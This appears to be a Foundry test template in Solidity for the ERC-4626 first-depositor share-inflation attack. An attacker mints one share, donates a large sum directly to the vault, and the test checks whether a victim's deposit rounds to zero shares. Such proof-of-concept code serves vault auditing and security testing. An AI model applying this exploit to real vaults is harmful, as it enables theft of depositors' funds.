pragma solidity ^0.8.20;

// Template: ERC-4626 first-depositor share inflation (Cream pattern)
// Attacker becomes first depositor, mints 1 share, then donates large amount.
// Next depositor's deposit rounds to 0 shares (price too high).

import "forge-std/Test.sol";

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function convertToShares(uint256) external view returns (uint256);
    function asset() external view returns (address);
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract Erc4626InflationExploit is Test {
    address constant VAULT = address(0); // TODO
    uint256 constant FORK_BLOCK = 0;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        if (FORK_BLOCK > 0) {
            vm.createSelectFork(vm.envString("RPC_URL"), FORK_BLOCK);
        }
    }

    function test_Exploit_FirstDepositorInflation() public {
        IERC4626 vault = IERC4626(VAULT);
        IERC20 asset = IERC20(vault.asset());

        // Pre-condition: vault has 0 totalSupply
        require(vault.totalSupply() == 0, "Already initialized");

        // Fund attacker
        deal(address(asset), attacker, 1000e18);

        // Step 1: attacker deposits 1 wei → 1 share
        vm.startPrank(attacker);
        asset.approve(VAULT, 1);
        uint256 attackerShares = vault.deposit(1, attacker);
        console.log("Attacker shares:", attackerShares);
        assertEq(attackerShares, 1);

        // Step 2: attacker donates 999e18 directly to vault
        asset.transfer(VAULT, 999e18);
        vm.stopPrank();

        console.log("Vault totalAssets:", vault.totalAssets());
        console.log("Vault totalSupply:", vault.totalSupply());

        // Step 3: victim deposits 100e18
        deal(address(asset), victim, 100e18);
        vm.startPrank(victim);
        asset.approve(VAULT, 100e18);
        uint256 expectedShares = vault.convertToShares(100e18);
        console.log("Victim expected shares for 100e18:", expectedShares);

        if (expectedShares == 0) {
            console.log("EXPLOIT CONFIRMED: victim gets 0 shares for 100e18 deposit");
            assertTrue(true, "Vault is inflation-attackable");
        } else {
            console.log("Victim gets >0 shares — vault likely has virtual shares protection");
            assertTrue(false, "Vault has protection");
        }
        vm.stopPrank();
    }
}
